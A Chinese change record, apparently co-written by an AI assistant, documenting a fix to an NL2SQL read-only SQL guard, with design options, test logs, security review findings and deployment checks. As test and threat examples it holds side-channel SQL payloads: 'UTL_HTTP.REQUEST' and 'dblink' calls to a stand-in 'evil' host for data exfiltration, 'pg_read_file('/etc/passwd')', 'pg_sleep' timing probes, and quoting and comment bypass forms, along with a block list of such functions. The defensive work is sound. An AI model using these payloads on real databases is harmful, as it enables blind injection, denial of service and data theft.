# 变更：fix-sql-guard-side-channel-and-reject-feedback

- **日期**：2026-09-26
- **作者**：Claude / 启琳
- **Phase**：Phase 4 安全护栏（`app/infrastructure/business_db_pool.py` + `app/services/nl2sql_service.py`）
- **状态**：done
- **关联变更**：[fix-chat-recall-fallback-and-context-budget](../fix-chat-recall-fallback-and-context-budget/summary.md)（同批次上一批）、[fix-chat-retry-failure-details](../fix-chat-retry-failure-details/summary.md)（「失败详情回灌让模型自愈」的前序批次，本批 M2 是同一思路在**安全闸门**上的落实）
- **迁移版本**：无
- **SSOT 出处**：`Harness/wiki/chat-service-assessment.md` §2.3 **M1 / M2** + §3 P1 第 9 项（评估日期 2026-09-25）—— 属根 `CLAUDE.md` 核心约束 #2「业务查询仅允许只读 SELECT，经 SQL Guard 校验」所在方向

---

## 1. 需求

两个缺陷都落在同一道闸门（SQL Guard）的两端：**拦得不够**与**拦了不说清**。

| # | 缺陷 | 影响 |
|---|---|---|
| **M1** | `_FORBIDDEN_FUNCTIONS` 只覆盖「写/文件类」函数（`nextval`/`pg_read_file`/`lo_export`…），**侧信道函数整类缺失**：`pg_sleep`、`pg_advisory_lock`、`pg_terminate_backend`、`dblink`、`UTL_HTTP`/`UTL_INADDR`/`UTL_TCP`、`LOAD_FILE`、`SLEEP`/`BENCHMARK`/`GET_LOCK`、`DBMS_LOCK`/`DBMS_PIPE`/`DBMS_LDAP` 全都能以 `SELECT pg_sleep(5)` 这种「首 token 合法」的形式通过白名单 | ①**时序侧信道**：`SELECT pg_sleep(5)` 按真/假条件拖住连接 ⇒ 盲注探测 + 连接池占满（DoS）；②**出网/跨库**：`UTL_HTTP.REQUEST('http://evil/?'||数据)`、`dblink('host=evil',…)` 把结果带出内网（数据外泄）；③**文件读**：`LOAD_FILE`/`UTL_FILE`/`pg_stat_file` 读服务器文件；④**进程/配置控制**：`pg_terminate_backend`、`pg_reload_conf`。这是「只读 SELECT」约束的**实质绕过**，不只是理论问题 |
| **M2** | `nl2sql_service.generateSql` 的重试循环在 `except SqlSafetyError` 里只回注一句固定文案「未通过安全校验（仅允许 SELECT/WITH 只读查询）」，**不带拒绝原因**（原因其实已在 `exc` 里、且已进日志） | LLM **看不到违规点**（是 `pg_sleep`？是 `INTO`？是多语句？），只能逐次盲改同一个错——重试预算烧完就整问失败。属核心约束 #6「显式错误处理」：服务端记了详细上下文，但**反馈链路上的消费者拿不到** |

**验收标准**：①侧信道黑名单覆盖 PG / MySQL / Oracle 三方言的时序、出网、文件、进程控制四类形态，且**不得误杀**同名的列、别名、表名（`SELECT COUNT(*) AS sleep` 与生产本体中的真实表名都不能挂）；②常见**绕过形态**（引号包裹的函数名、名字与括号间夹注释、schema/包限定、大小写）不得放行；③拒绝原因回注重试反馈，且**不回注被拒 SQL 本体**（避免把失败模式喂回给模型迭代）；④既有闸门语义（多语句、`INTO`、`SHARE`、DML/DDL 动词、写类函数）逐字不变。

## 2. 设计评审

### 2.1 黑名单与既有 `_FORBIDDEN_FUNCTIONS` 的关系

| 方案 | 做法 | 取舍 |
|---|---|---|
| A 把侧信道名字并进既有集合 | 一处集合、一处裸名匹配 | ❌ **口径不同，合并即事故**：既有集合都是「无论怎么出现都危险」的名字（`nextval`/`lo_export`），裸名匹配即可；而侧信道名字（`sleep`/`benchmark`/`get_lock`/`load_file`）是**普通词**，裸名匹配会把 `SELECT COUNT(*) AS sleep`、`T_BENCHMARK_…` 这类列/别名/表名一并杀掉 ⇒ 正常业务查询被拒 |
| B 独立集合 `_FORBIDDEN_CALLS` + **仅调用/包名形态**命中（**选定**） | 名字后紧跟 `(`（调用）或 `.`（包名段）才判 | ✅ 既保住「`pg_sleep(5)` 必拒」，又不碰同名标识符；两个集合**按约定互不重叠**（同名不放两处），避免后来者误以为两处口径相同而合并（注释里写明） |
| C 对 SQL 文本跑正则 | `re.search(r'\b(pg_sleep|utl_http|…)\s*\(', sql, re.I)` | ❌ 在**未去注释/未去字符串**的原文上匹配：`SELECT 'pg_sleep(' AS note` 会被误杀，而 `pg_sleep/**/(5)` 又能绕过 —— 正则与分词器打架，两侧都错 |

### 2.2 绕过形态要不要在本批一并堵

| 方案 | 做法 | 取舍 |
|---|---|---|
| A 只判裸名 token（不处理引号、不跳注释） | 最少改动 | ❌ **等于白名单可被一个字符绕开**：sqlparse 把 `"pg_sleep"` 归为 `Token.Literal.String.Symbol`（引用标识符），而既有循环在 `T.Literal` 处 `continue` ⇒ `SELECT "pg_sleep"(5)` 直接放行；`` `sleep`(10) ``（MySQL 反引号）被归为 `Name` 但值是 ``` `sleep` ```（带引号），`upper` 后与集合不等 ⇒ 也放行；`pg_sleep /*c*/ (5)` 因名字后第一个 token 是注释 ⇒ 也放行。**实测**（见 §6 RED-2）三种形态在朴素实现下全部漏过 |
| B 去引号归一 + 前瞻跳注释，且把该判定**提前**到 `T.Literal` 跳过之前（**选定**） | `_unquoteIdentifier` + `_isCallOrPackageShape`（跳过空白/注释后再看是否 `(`/`.`） | ✅ 三个绕过形态同时堵住；「提前」是必须的：`Literal.String.Symbol` 在**语义上是引用名而非字面量**，本就不该走字面量跳过分支；字符串字面量（`T.Literal.String.Single`）仍照旧跳过，`SELECT 'DELETE FROM x'` 不受影响 |
| C 只归一不跳注释 | 少写一个循环 | ❌ `pg_sleep /*c*/ (5)` 仍漏 —— 注释是 LLM 生成 SQL 时最容易被顺带写出来的东西（`SELECT pg_sleep /*5s*/ (5)`），漏它等于没修 |

### 2.3 拒绝原因回注的形态

| 方案 | 做法 | 取舍 |
|---|---|---|
| A 保持现状（固定文案） | 不改 | ❌ 这正是 M2 本身：模型无法自愈（评估文档原文「LLM 只见『未通过安全校验』，无法自愈守卫违规」） |
| B 回注 `exc`（原因文本），**不回注被拒 SQL**（**选定**） | `f"…未通过安全校验（仅允许 SELECT/WITH 只读查询）: {exc}"` | ✅ `str(exc)` 只含原因（`SqlSafetyError.__init__` 把被拒 SQL 存在独立属性 `exc.sql`，`DomainError` 只 `super().__init__(message)`，**不重写 `__str__`**）⇒ 天然满足「不喂回失败模式」；与同文件既有先例（`prior_cte` 的 `detail=…: {exc}`）口径一致 |
| C 回注 `exc` + 被拒 SQL 片段（截断） | 帮模型定位到具体字符 | ❌ 与既有策略冲突：把被拒 SQL 喂回下一次 prompt 会让模型倾向于**微调那一段**（包含绕过思路）而非重写；且被拒 SQL 常在语法上就是恶意的，等于用模型自己的越权输出做 few-shot |

### 2.4 `INTO` 误拒（评估文档 M1 行第三项）要不要一并改

评估文档 M1 行原写「**`INTO` 过度拦截**（含良性 `SELECT…INTO`）」。本批**逐条实测**后判定：**不改，并修正该描述**（证据见 §6 探针）：

| 形态 | 实测 | 判断 |
|---|---|---|
| `SELECT a FROM t INTO x` / `SELECT a INTO newtab FROM t` | 拒（`禁止的 SQL 操作: INTO`） | ✅ 正确：PG 的 `SELECT … INTO` 会**建表**（写） |
| `SELECT a INTO OUTFILE '/tmp/x' FROM t` | 拒 | ✅ 正确：MySQL 写服务器文件 |
| `SELECT a INTO @v FROM t` | 拒 | ✅ 正确：MySQL 变量赋值（会话状态写） |
| `SELECT 1 AS "into" FROM t` | **放行** | ✅ 唯一合法写法（引号标识符，走 `Literal` 跳过分支）不被误杀 |
| `SELECT 1 AS into FROM t`（未加引号别名） | 拒 | ⚠️ **真实误拒**：PG 实测接受该写法（`AS into` 不是保留字冲突），但这是安全闸门**应有的过拦偏向**——一个叫 `into` 的别名毫无业务价值，且 M2 落地后模型能直接看到「禁止的 SQL 操作: INTO」并改名自愈 |

**决策原则（写入下批参考）**：安全闸门的**误拒**可通过 M2 的自愈反馈消解，而**漏拦**不可自愈（数据已经出去了）。故闸门一律取「过拦」偏向，不为此在安全边界上引入 shape 判定（改错方向 = 放行一次真实侧信道）。

## 3. 数据模型变更

无。纯代码侧改动（一个模块级常量集合 + 两个纯函数 + 一处异常分支的文案），无迁移、无新表/新列、无配置项。

## 4. 接口契约变更

**无字段 / 类型 / 状态码变更**。变的是「哪些 SQL 会被拒」与「重试反馈里能看到什么」：

| 面 | 修复前 | 修复后 |
|---|---|---|
| 被拒 SQL 集合 | 侧信道函数（`pg_sleep` / `dblink` / `UTL_HTTP` / `LOAD_FILE` / `SLEEP` / `BENCHMARK` / `pg_advisory_lock` / `pg_terminate_backend` …）**放行** | 拒（`SqlSafetyError`），错误文案 `禁止的 SQL 操作: <函数名>`；同名标识符（列/别名/表名）不受影响 |
| 重试反馈（注入下一次尝试的 user prompt） | `…未通过安全校验（仅允许 SELECT/WITH 只读查询）` | `…未通过安全校验（仅允许 SELECT/WITH 只读查询）: 禁止的 SQL 操作: PG_SLEEP`（多轮时按 `；` 串接，整段受 `_ERROR_SNIPPET_LIMIT=200` 截断） |
| 对外的错误文案/状态码 | — | 逐字不变（`SqlSafetyError.message` 未改，仅多被一处消费者读取） |
| 既有闸门语义 | — | 逐字不变（`T.Literal` 跳过、`INTO`/`SHARE`/DML/DDL、`_FORBIDDEN_FUNCTIONS` 裸名匹配路径均未动） |

## 5. 实现要点

| 文件 | 改动 |
|---|---|
| `app/infrastructure/business_db_pool.py` | ①模块级 `from sqlparse import tokens as T`（原先在 `_assertNoHiddenWrites` 内局部导入，现被新 helper 共用；`T` 在文件内无他处使用，无遮蔽风险）；②新增 `_FORBIDDEN_CALLS`（四类：时序/锁/DoS、跨库/出网、文件 I/O、进程/配置控制；**仅「调用形态」命中**）与 `_FORBIDDEN_PACKAGES`（Oracle 包/类型，**仅「包名形态」命中**），注释写明与 `_FORBIDDEN_FUNCTIONS` 的**口径差异**与「互不重叠」约定；③新增 `_IDENTIFIER_QUOTES` + `_unquoteIdentifier`（剥离 `"x"` / `` `x` `` / `[x]`）；④新增 `_callShape(flat, idx)`（跳过空白与注释后返回 `"call"` / `"package"` / `None`）；⑤`_assertNoHiddenWrites` 改为 `flat = list(stmt.flatten())` + 索引循环，把 `T.Name`/`T.Literal.String.Symbol` 的判定**提到 `T.Literal` 跳过之前**，并按「裸名写函数集 → 调用形态 → 包名形态」三判；⑥删掉循环末尾重复的 `ttype is T.Name and upper in _FORBIDDEN_FUNCTIONS`（已被引号归一分支完全覆盖，留两套口径必再分叉）；⑦docstring 同步新口径 |
| `app/services/nl2sql_service.py` | ①`generateSql` 重试循环的 `except SqlSafetyError` 分支：`errors.append(f"…: {exc}")`（注释说明 `str(exc)` 只含原因、`exc.sql` 不进消息体）；②`_buildUserPrompt` 的 `errors` 段补 `_sanitizeContext`（与既有 `executionError` 段同口径） |
| `app/tests/unit/test_datasource_pool.py` | `TestAssertReadOnly` 两类参数化用例扩到 **35 例**：`test_rejects_side_channel_functions`（19 → **30**：+5 绕过形态、+5 引号写函数族、+6 侧信道漏项、+5 复审补全）、`test_accepts_identifiers_containing_side_channel_words`（5 → **11**：+3 引号标识符、+2 点号形态别名、+2 前缀相似标识符） |
| `app/tests/unit/test_nl2sql_service.py` | 新增 `test_safety_rejection_feeds_reason_back_to_retry_prompt`（用 M1 新黑名单的 `pg_sleep` 作被拒样本，同时钉「原因可见」与「SQL 本体不回注」）与 `test_user_prompt_neutralizes_angle_brackets_in_errors`（errors 段消毒） |

**不可变数据**：`_unquoteIdentifier` 返回新字符串；`_isCallOrPackageShape` 纯读；`_assertNoHiddenWrites` 只把 `stmt.flatten()` 收进局部列表（不改 AST）；`nl2sql_service` 侧只向 `errors` 列表追加（既有可变列表，非本批引入）。

## 6. 测试

TDD：先写用例、看它按**预期原因**红，再改实现。

**RED-1（M1 主用例，实现前）** —— 只补用例、黑名单尚未存在：

```
app/tests/unit/test_datasource_pool.py -k "side_channel or containing"
                                    19 failed, 5 passed, 57 deselected in 9.45s
```

19 个「必须拒」全部 `DID NOT RAISE SqlSafetyError`；5 个「必须放行」全绿（它们正是防止过拦的对照，事后证明有效：新增黑名单后仍全绿）。

**RED-2（M1 绕过形态，反向探针）** —— 5 个绕过用例是**实现完成后**追加的，为证明它们不是「顺带通过的空断言」，把实现退回**朴素版**（`ttype is T.Name` 单条件 + 前瞻不跳注释、不去引号）后重跑：

```
app/tests/unit/test_datasource_pool.py -k "side_channel"
                                    3 failed, 29 passed, 57 deselected in 10.34s
FAILED …test_rejects_side_channel_functions[SELECT "pg_sleep"(5)]
FAILED …[SELECT `sleep`(10)]
FAILED …[SELECT pg_sleep /* 注释 */ (5)]
E       Failed: DID NOT RAISE SqlSafetyError
```

⇒ 恰好是依赖「去引号归一」与「前瞻跳注释」的那 3 例红，另 2 例（`UTL_HTTP.REQUEST /*c*/ (…)`、`utl_http.request(…)`）朴素版也能拦（包名形态只看 `.`）—— 证明新代码是**承重**的，不是装饰。（探针后恢复原文件并核对 md5：`aee21795b5ab361598fee0faf2b9c425` 与探针前一致。）

**RED-3（M2，实现前）** —— 断言重试反馈可见具体违规点：

```
E  AssertionError: assert 'PG_SLEEP' in '用户问题：问题\n\n之前的尝试失败，请修正后重新生成 SQL。
   错误信息：第 1 次尝试生成的 SQL 未通过安全校验（仅允许 SELECT/WITH 只读查询）'
app/tests/unit/test_nl2sql_service.py:886
1 failed, 1 passed, 99 deselected in 1.50s
```

**同一用例的 stderr 同时钉住了缺陷的精确边界**——原因**已在日志里**，只是没进 prompt：

```
WARNING NL2SQL 安全校验失败 attempt=1: 禁止的 SQL 操作: PG_SLEEP
```

**RED-4（复审后发现的两向缺陷：漏拦 + 误杀，实现前）** —— 按两位复审给出的「漏拦/误杀」清单先补用例：

```
app/tests/unit/test_datasource_pool.py -k "side_channel or containing"
                                    13 failed, 34 passed, 57 deselected in 15.92s
FAILED …[SELECT "nextval"('s')]                      ← 引号标识符可调用真函数（写序列）
FAILED …[SELECT "pg_read_file"('/etc/passwd')]        ← 引号形态读服务器文件
FAILED …[SELECT "dblink_exec"('conn', 'select 1')]
FAILED …[SELECT "lo_import"('/tmp/x')]
FAILED …[SELECT `nextval`('s')]
FAILED …[SELECT pg_sleep_for('1 second')]             ← PG 9.6+ 睡眠函数，真可执行
FAILED …[SELECT pg_sleep_until(now() + interval '1 second')]
FAILED …[SELECT DBMS_LOB.LOADFROMFILE('DIR', 'f') FROM dual]
FAILED …[SELECT MASTER_POS_WAIT('f', 0, 5)]           ← MySQL 复制位点等待（阻塞连接）
FAILED …[SELECT lo_put(1, 0, 'x')]                    ← PG 大对象写
FAILED …[SELECT pg_notify('ch', 'payload')]
FAILED …[SELECT sleep.col FROM foo sleep]            ← 误杀：黑名单词作表别名 + 点号形态
FAILED …[SELECT dblink.id FROM t dblink]
E       Failed: DID NOT RAISE SqlSafetyError（前 11 例）
E       Failed: DID NOT RAISE …（后 2 例为 accepted-应通过却抛错，方向相反）
```

**RED-5（errors 段消毒，实现前）**：

```
E       AssertionError: assert '<conversation_history>' not in '用户问题：查各供应商收...ion_history>'
1 failed, 101 deselected in 1.08s
```

**GREEN**：

```
app/tests/unit/test_datasource_pool.py                               104 passed（+15 例）
app/tests/unit/test_nl2sql_service.py                                102 passed（+2 例）
两文件合并跑                                                          206 passed in 65.60s
```

**探针：`INTO` 误拒的边界（回答评估文档 M1 行的第三项）** —— 直接调 `_assert_read_only` 逐条实测：

```
REJECT  SELECT a FROM t INTO x                  -> 禁止的 SQL 操作: INTO
REJECT  SELECT a INTO newtab FROM t              -> 禁止的 SQL 操作: INTO
REJECT  SELECT a INTO OUTFILE '/tmp/x' FROM t    -> 禁止的 SQL 操作: INTO
REJECT  SELECT a INTO @v FROM t                  -> 禁止的 SQL 操作: INTO
ACCEPT  SELECT "into" FROM t
ACCEPT  SELECT into_col FROM t
REJECT  SELECT * FROM t INTO
REJECT  WITH x AS (SELECT 1 AS into) SELECT into FROM x
```

并用**真实 PostgreSQL**（`qa-postgres`）确认 `SELECT 1 AS into` 合法、`SELECT 1 AS "into"` 同样合法 ⇒ 唯一被误拒的合法形态是「未加引号的 `AS into` 别名」（见 §2.4 决策：不改，闸门取过拦偏向）。

**探针：新黑名单对生产本体零误杀面**（比单元用例更强的证据）—— 按黑名单全词表在 **prod `qa_metadata`** 的 `ontology_class`（`class_name`/`source_table`/`class_alias`）与 `ontology_property`（`property_name`/`source_column`/`property_alias`）上做去噪（剥非 `A-Z_` 后）子串匹配，**命中 0 行** ⇒ 现网不存在「名字恰好是黑名单词（或含其子串）」的类/属性，不可能因本次改动误拒真实业务查询。

<!-- §7 安全审查 / §8 部署验证 见下（本节由审查与部署结果回填） -->

## 7. 安全审查

两轮静态审查并行（`code-reviewer` + `security-reviewer`，均按要求**不跑 pytest**、只做读码与 `sqlparse`/`_assert_read_only` 实测，避免与主套件争用测试库）。**两轮都在本批改动里找出了真缺陷，且相互独立**（各自发现的漏项不重叠），因此本批经历了一次「实现 → 审查 → 再 RED → 再 GREEN」的循环：

| 轮次 | 结论（首轮） | 处置 |
|---|---|---|
| code-reviewer | **WARNING** — 0 CRITICAL / 1 HIGH / 1 MEDIUM / 2 LOW | HIGH 与 MEDIUM 当场修（见下表），2 LOW 一修一记录 |
| security-reviewer | **FAIL** — 0 CRITICAL / 2 HIGH / 4 MEDIUM / 4 LOW | 2 HIGH + 3 MEDIUM + 1 LOW 当场修；结构性问题 MEDIUM-6 转独立提案（见 §9） |

| 级别 | 发现 | 处置 |
|---|---|---|
| HIGH-1（security） | **`pg_sleep_for` / `pg_sleep_until` 未收录**：PG 9.6+ 内建，与 `pg_sleep` 完全同类（拖连接 = DoS + 时间盲注），实测 `SELECT pg_sleep_for('1 second')` 放行 | 先补 RED（含 `pg_sleep_until`、`pg_catalog.` 限定形态）再收录 |
| HIGH-2（security）+ HIGH（code） | **`_FORBIDDEN_FUNCTIONS` 只认 `T.Name` ⇒ 引号包裹的写函数整族绕过**：`SELECT "nextval"('s')`（真写序列）、`"pg_read_file"('/etc/passwd')`、`"dblink_exec"(…)`、`"lo_import"(…)`、`` `nextval`('s') `` 全部放行（对照裸名均被拒）。**两轮独立命中同一条** | 先补 5 例 RED 再修：把「裸名写函数集」判定也搬到引号归一分支（并删掉循环末尾重复的旧判定，避免两套口径再分叉）。**性质**：`Literal.String.Symbol` 被字面量分支跳过属**预存**缺陷（改前同样绕过），但本批已引入归一化解药却只做了一半 ⇒ 本批修掉，不留「同一手法一半能堵一半不能」的矛盾 |
| MEDIUM-3（security） | `DBMS_LOB` 未收录（`LOADFROMFILE` 读服务器文件进 LOB） | 补 RED 后收录进 `_FORBIDDEN_PACKAGES` |
| MEDIUM-4（security） | MySQL 复制位点等待函数未收录（`MASTER_POS_WAIT` 等 4 个，可阻塞连接） | 补 RED 后收录 |
| MEDIUM-5（security） | PG 大对象**写**函数未收录（`lo_put`/`lo_create`/`lo_unlink`/`lowrite`；既有集合只有 `lo_export`/`lo_import`） | 补 RED 后收录 |
| MEDIUM（code） | **包名形态误杀**：`_isCallOrPackageShape` 对 `.` 一律放行，导致「黑名单词作表别名 + 限定列」被拒（`SELECT sleep.col FROM foo sleep`）——违反「不得误杀合法查询」不变量，且纯函数名根本不可能以 `.` 调用 | 先补 2 例 RED（`sleep.col` / `dblink.id`）再修：拆成 `_FORBIDDEN_CALLS`（须 `(`）与 `_FORBIDDEN_PACKAGES`（须 `.`），`_callShape` 返回形态而非布尔 |
| LOW-10（security） | 零星侧信道缺项：`pg_notify`（出带 NOTIFY）、`pg_ls_waldir`/`pg_ls_logdir`/`pg_ls_tmpdir`（目录列举） | 补 RED 后一并收录（成本一行/个） |
| LOW-9（security）+ LOW（code） | `errors` 段未过 `_sanitizeContext`，与已消毒的 `executionError` 段口径不一致；而 M2 恰好让该段开始承载 `MSG_SQL_NOT_READONLY` 的「收到的首 token」（LLM 任意文本） | 先补 RED（`<conversation_history>` 必须被转义）再修：errors 段补消毒。**注**：两轮均判定这不是真实注入面（自回显、单 token、`_ERROR_SNIPPET_LIMIT=200` 截断），修的是**防线一致性**而非漏洞 |
| LOW-7（security） | `(pg_sleep)(5)` 放行 | **不改**：`(func)(args)` 在 PG/MySQL/Oracle 均非合法调用语法（不会真正执行），且 `_callShape` 只认 `(`/`.`。已在 `_callShape` docstring 注明该形态返回 None 的原因 |
| LOW-8（security） | `pg_sleep::text` / 裸 `SELECT pg_sleep` 放行 | **不改**：前者是对标识符做 cast、后者是列引用（均不调用函数，报错无副作用）。已在探针表记录 |
| LOW（code，残差） | `logger.warning("NL2SQL 安全校验失败 attempt=%d: %s", …, exc)` 不截断，病态超长首 token 会灌日志 | **不改**（低危）：SQL 长度受 LLM `max_tokens` 上界约束，非无界输入；记录待清理 |
| MEDIUM-6（security，**转独立提案**） | **库侧无只读账号、无服务端 `statement_timeout`**：`execute_read_only` 用完整业务凭据执行，只有客户端 `asyncio.wait_for`（`queryTimeoutSeconds` 默认 30s）⇒ **解析层黑名单是唯一闸门**，一旦被形态绕过就直接落库。实测 `grep -rn "statement_timeout\|READ ONLY\|readOnly"` 在 `business_db_pool.py` / `config.py` **零命中**（顺带证实 `nl2sql-engine.md:39` 写的「连接级 `statement_timeout`」是**文档漂移**，本次一并修正该行） | **本批不做**（需业务库侧授权/配置变更，且 Oracle THBI 等外部库不在本仓库控制范围内）：**新增独立提案** `Harness/changes/2026-09-26-sql-guard-db-side-readonly-proposal.md`，把「黑名单 = UX 快速失败层，库侧只读 = 真闸门」的分层结论与所需动作写清（见 §9） |

**取向下的一致性说明**：本批所有「误杀」类发现的处置分两种——**能确定性排除误杀的（点号形态）就修**；**无法在不损害拦截力的前提下排除的（未加引号的 `AS into` 别名）就不修**，理由见 §2.4：安全闸门的误拒可由 M2 的自愈反馈消解，漏拦不可自愈。

**验证方法**：两轮复审均以**可执行证据**为准（列出「实测 ALLOWED/REJECTED」对照表），不是读码推断；本批据此把每一条「实测 ALLOWED」都变成了新用例（RED → GREEN），故第二轮之后不存在「审查说了但没测」的条目。

## 8. 部署验证

**部署方式**：镜像重建（不是 `docker cp` 临时灌码），命令与结果如下。

```bash
# 1) 构建（阿里云镜像源，实测 23s）
cd docker && docker compose build backend          # → Image qa-system-backend Built，exit=0
# 2) 用新镜像重建容器
cd docker && docker compose up -d backend          # → qa-backend Started
#    启动判据不是「cp 没报错」，而是日志出现 "Application startup complete."（已等到）
```

**① 容器代码 == 仓库代码（部署凭据）**

| 文件 | 部署前（容器） | 部署后（容器） | 仓库 |
|---|---|---|---|
| `app/infrastructure/business_db_pool.py` | `488bbac4…` | **`b0cc2f4bf15f99edbdcad53436433971`** | **同左** ✅ |
| `app/services/nl2sql_service.py` | `0cde54bd…` | **`6a91c5c65b84f801dd42a5003eb53d6e`** | **同左** ✅ |

**② 新符号确实进了容器**（`grep -c` 在容器内执行）：`PG_SLEEP_FOR|MASTER_POS_WAIT|DBMS_NETWORK_ACL_ADMIN|UTL_INADDR` = 4；
`_FORBIDDEN_CALLS|_FORBIDDEN_PACKAGES` = 7；`未通过安全校验` = 3。

**③ 真机行为探针**（容器内跑真实模块，非测试替身）：

```bash
docker cp /tmp/m1m2_probe.py qa-backend:/tmp/ && docker exec -w /app qa-backend python /tmp/m1m2_probe.py
→ REJECT 用例: 14  ACCEPT 用例: 6
→ M2 消息样例: 禁止的 SQL 操作: PG_SLEEP
→ PROBE PASS   (exit=0)
```

- **14 例「必须拒」全部被拒**，含裸名（`pg_sleep`）、引号族（`"pg_sleep" /*c*/ (5)`、`` `sleep`(10) ``
  ——注释与反引号同时构成的混合形态）、`"nextval"('s')`、`UTL_HTTP.REQUEST`、`dblink(...)`、
  `DBMS_LOCK.SLEEP`、`lo_put`、`pg_sleep_for`、`MASTER_POS_WAIT`、`pg_terminate_backend`、
  `pg_read_file`、`SELECT … INTO OUTFILE`、多语句注入；
- **6 例「必须放行」全部放行**（`AS sleep` 别名、`FROM foo sleep` 表别名、`"sleep"` 列名、
  `nextval_count` 列名、普通聚合、CTE）——**误杀面在真机为空**；
- **M2 断言**：`str(SqlSafetyError)` 含原因（`PG_SLEEP`）且**不含**被拒 SQL 原文 ⇒ 回注安全。

**④ 网关连通（重建容器后 nginx 未 502 —— 上游解析已持久化修复）**

```
curl http://localhost:8000/api/v1/health  → 200 {"status":"ok", ...}   # 直连后端
curl http://localhost:5173/api/v1/health  → 200 {"status":"ok", ...}   # 经 nginx
docker logs qa-backend | grep -iE "error|traceback" → 无启动期错误
```

**⑤ 测试证据（本批改动后的真实套件）**

| 套件 | 结果 | 说明 |
|---|---|---|
| `app/tests/unit`（全量，单进程串行，737s） | **2 failed / 2324 passed / 1 skipped** | 两条失败均为**预存**（`test_chat_service.py::TestSearchByKeywordAdsWeighting`（ADS 加权死代码）、`test_dependencies.py::test_stub_disabled_raises_permission_denied`（`Header.lower()`））⇒ **本批 delta = 0** |
| `test_datasource_pool.py` + `test_nl2sql_service.py`（**最终 hash** 上复跑） | **206 passed**（104 + 102） | 复跑原因：全量套件启动后我对 import 块做了一次 isort 归位（`from sqlparse import tokens as T` 的位置），文件 hash 变了 ⇒ 用最终 `b0cc2f4b…`/`6a91c5c6…` 的产物重跑，证据与提交物同 hash |
| 集成切片 6 文件（guard 真实消费者：`test_receiptdetail_qty_alias` / `test_supplier_po_completion_rate` / `test_multistep_global_filter` / `test_feature_definition_api` / `test_datasource_api` / `test_l2_cte_avg_of_ratios`，单进程串行） | **45 passed**（23s） | 真实 PostgreSQL + 完整 API 链路 |
| `ruff check` 本批 4 文件 | 6 errors（HEAD 亦 6，**集合相同**，仅行号位移 74→153 / 556→633） | 归位 import 后 delta = 0；余下 `UP037`/`I001`/`B904` 均为预存 |

**⑥ 过程中的环境前置（如实记录，非本批代码问题）**：跑完全量 unit 套件后，测试库
`qa_metadata_test` 的 `ontology_class` 被 autouse `TRUNCATE` 抹成 0 行（≥0039/0040 迁移种子）——
这是「混跑套件 truncate 陷阱」的既有现象。按既有恢复法处理后才跑集成切片：

```bash
psql -d qa_metadata_test -c "DROP SCHEMA public CASCADE; CREATE SCHEMA public;"
DATABASE_URL="postgresql+asyncpg://…@localhost:5433/qa_metadata_test" .venv/bin/alembic upgrade head
# ⚠️ 必须用 DATABASE_URL 覆盖：alembic/env.py 只认 Settings.databaseUrl（.env 指向 prod qa_metadata）
# 验证：test ontology_class=5；prod qa_metadata 行数未受影响
```

**结论**：解析层黑名单 + M2 反馈在本批已按「真机可执行证据」验证到位；
但**库侧只读兜底仍缺**（§7 MEDIUM-6 / §9 提案）——**本批的部署不改变「解析层是唯一闸门」这一结构性事实**。

## 9. 关联

- 评估文档：`Harness/wiki/chat-service-assessment.md` §2.3 M1 / M2（本次标 ✅ 并修正 M1 行的 `INTO` 描述）、§3 P1 第 9 项（本次只完成 M1/M2 两项，M3 `QueryPlan.from_dict` 仍待做）、§0 修复进度
- 机制文档：`Harness/wiki/nl2sql-engine.md`（SQL Guard 段：修正 `sql_guard.py` 路径漂移 + 删除不存在的「连接级 `statement_timeout`」声明 + 补侧信道黑名单与「拒绝原因回注」链路）；`Harness/wiki/data-model.md`（本批无数据模型变更）
- 新提案：`Harness/changes/2026-09-26-sql-guard-db-side-readonly-proposal.md`（MEDIUM-6：库侧只读账号 + 服务端超时）
- 代码契约出处：`app/infrastructure/business_db_pool.py`（`_FORBIDDEN_FUNCTIONS` / `_FORBIDDEN_CALLS` / `_FORBIDDEN_PACKAGES` / `_unquoteIdentifier` / `_callShape` / `_assertNoHiddenWrites`）、`app/domain/exceptions.py`（`SqlSafetyError.sql` 与消息体分离——回注安全的依据）、`app/services/nl2sql_service.py`（`_buildUserPrompt` 的 errors 注入点 + `_ERROR_SNIPPET_LIMIT` + `_sanitizeContext`）
- 规则：根 `CLAUDE.md` 核心约束 #2（只读 SELECT + SQL Guard）、#6（显式错误处理）；`Harness/rules/测试规范.md`（真实数据库 + 真实 API 链路）
- Memory：`qa-system-sql-guard-side-channel.md`（新增）

---

## SSOT 校验清单（合并前必查）

- [x] frontmatter 元数据齐全（日期 / 作者 / Phase / 状态 / 关联变更 / 迁移版本 / SSOT 出处）
- [x] 9 段都非空，无 TBD/TODO 占位
- [x] 第 2 段 ≥ 2 个候选方案对比（4 处设计决策，各 2–3 案，含被否理由）
- [x] 第 3 段：无迁移（显式写「无」）
- [x] 第 7 段：两轮审查（code-reviewer WARNING + security-reviewer FAIL 首轮结论**如实记录**）+ 每条发现的处置与验证方式；1 条 LOW 残差、1 条 MEDIUM 转独立提案
- [x] 第 8 段给出部署命令 + 真机验证结果（容器 hash 对照 + 容器内 14/6 行为探针 + nginx 连通 + 全量 unit/集成/ruff 三方证据，**已回填**）
- [x] 第 9 段 ≥ 3 个跨文件链接
- [x] 相关 wiki 文档（`chat-service-assessment.md` §0 / §2.3 M1·M2 / 新增修复段；`nl2sql-engine.md` SQL Guard 段纠漂移）已同步
- [x] 至少 1 条 MEMORY 索引已添加（`qa-system-sql-guard-side-channel.md`）
